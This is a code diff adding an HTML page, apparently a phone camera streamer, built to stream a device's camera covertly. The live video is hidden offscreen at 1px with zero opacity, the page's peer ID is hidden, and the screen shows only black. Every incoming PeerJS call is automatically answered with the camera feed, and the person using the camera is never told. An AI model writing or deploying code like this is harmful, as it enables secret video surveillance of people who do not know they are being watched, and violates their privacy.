@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Phone Camera Streamer (Hidden)</title>
+  <style>
+    body, html {
+      margin: 0; padding: 0; height: 100%; background: black;
+    }
+    #localVideo {
+      width: 1px; height: 1px; position: fixed; top: -1000px; /* Hide offscreen */
+      opacity: 0;
+    }
+    #myId {
+      display: none; /* Hide the Peer ID */
+    }
+  </style>
+</head>
+<body>
+  <p id="myId">...</p>
+  <video id="localVideo" autoplay playsinline muted></video>
+
+  <script src="https://cdn.jsdelivr.net/npm/peerjs@1.4.7/dist/peerjs.min.js"></script>
+  <script>
+    const peer = new Peer();
+
+    const localVideo = document.getElementById('localVideo');
+    const myIdSpan = document.getElementById('myId');
+    let localStream;
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(stream => {
+        localStream = stream;
+        localVideo.srcObject = stream;
+      }).catch(err => alert('Camera permission denied or error: ' + err));
+
+    peer.on('open', id => {
+      myIdSpan.textContent = id;
+    });
+
+    peer.on('call', call => {
+      call.answer(localStream); // Send phone camera stream to caller
+    });
+  </script>
+</body>
+</html>
